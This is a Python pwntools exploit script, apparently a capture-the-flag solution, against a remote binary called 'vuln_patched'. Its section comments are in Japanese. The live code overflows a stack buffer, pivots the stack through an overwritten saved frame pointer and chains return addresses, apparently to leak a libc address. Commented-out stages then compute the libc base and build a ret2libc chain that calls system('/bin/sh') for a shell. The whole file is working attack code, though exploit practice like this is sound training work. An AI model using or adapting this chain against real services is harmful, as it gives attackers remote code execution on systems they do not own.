from pwn import *
from ctftools.pwn.common import connect

exe = ELF("vuln_patched")
libc = ELF("libc.so.6")
io = connect(exe, "host", 1337)

offset = 0x28
pop_rbp_gadget = 0x40115D  # pop rbp ; ret
call_print_addr = exe.symbols.main + 66
ret = 0x40101A

# *************************************************
# workspace に移動
# *************************************************
workspace_addr = exe.symbols.print + 0x20 + 0x20
payload = flat(
    b"A" * (offset - 8),
    workspace_addr,  # saved rbp
    exe.symbols.main + 12,  # sub rsp,0x20
)
io.sendline(payload)
io.recvuntil(payload[:5])
io.recvline()

# *************************************************
# workspace で ROP を組み立てる
# *************************************************
payload = flat(
    pack(exe.symbols.main),
    b"A" * (-8 + offset - 8),
    workspace_addr - 0x20,  # saved rbp (== exe.symbols.print + 0x20)
    ret,
    call_print_addr,
)
io.sendline(payload)
io.recvuntil(payload[:5])
io.recvline()
io.interactive()

# libc_puts_addr = int.from_bytes(io.recvline().strip(), "little")
# libc_base_addr = libc_puts_addr - libc.symbols.puts
# libc.address = libc_base_addr

# print(hex(libc.address))

# io.interactive()


# rop = ROP(libc)
# bin_sh = next(libc.search(b"/bin/sh"))
# rop.call(libc.sym["system"], [bin_sh])

# print(rop.dump())

# payload = flat(b"A" * offset, rop.chain())
# io.sendline(payload)

# # rop = ROP(libc)

# # payload = rop.system([next(libc.search(b"/bin/sh"))])
# # print(hex(libc.symbols.puts))
# # print(hex(libc.symbols.system))
# # print(hex())
# # print(payload)

# io.interactive()
